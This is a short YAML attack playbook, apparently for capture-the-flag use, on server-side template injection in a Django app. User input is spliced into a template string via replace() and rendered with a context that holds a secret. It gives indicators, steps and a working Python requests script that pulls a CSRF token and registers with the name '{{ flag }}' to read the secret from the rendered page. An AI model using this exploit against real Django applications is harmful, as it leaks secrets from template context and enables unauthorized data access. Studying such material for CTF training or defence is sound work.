name: django_ssti_template_string_replace
category: web
tags: [ssti, django, template_injection, string_replace]
indicators:
  - "Django template engine engine.from_string()"
  - "User input replaced into template string via replace()"
  - "Template context contains sensitive variables (e.g., flag)"

tricks:
  - name: "Step 1: Identify SSTI vulnerability"
    when: "Analyze source code"
    how: "User input name parameter directly replaced into template string"
    payload: |
      template_str.replace('ACCOUNTNAME', request.session['name'])
      # Then rendered with Django template engine

  - name: "Step 2: Exploit template context"
    when: "flag is in template context"
    how: "flag passed as context variable, inject {{ flag }} to read it"
    payload: |
      template.render({'flag':flag}, request)
      # Inject: {{ flag }}

  - name: "Step 3: Extract the flag"
    when: "Execute attack"
    how: "Register with name={{ flag }}, complete steps, view rendered flag"
    payload: |
      s = requests.Session()
      
      # Step 1: Inject payload in name
      resp = s.get(f"{TARGET}/accounts/register/step1/")
      csrf = re.search(r'csrfmiddlewaretoken" value="([^"]+)"', resp.text).group(1)
      s.post(f"{TARGET}/accounts/register/step1/", data={
          "csrfmiddlewaretoken": csrf,
          "name": "{{ flag }}",
          "password": "test123456"
      })
      
      # Step 2: Complete email
      # Step 3: View flag in rendered template
      resp = s.get(f"{TARGET}/accounts/register/step3/")

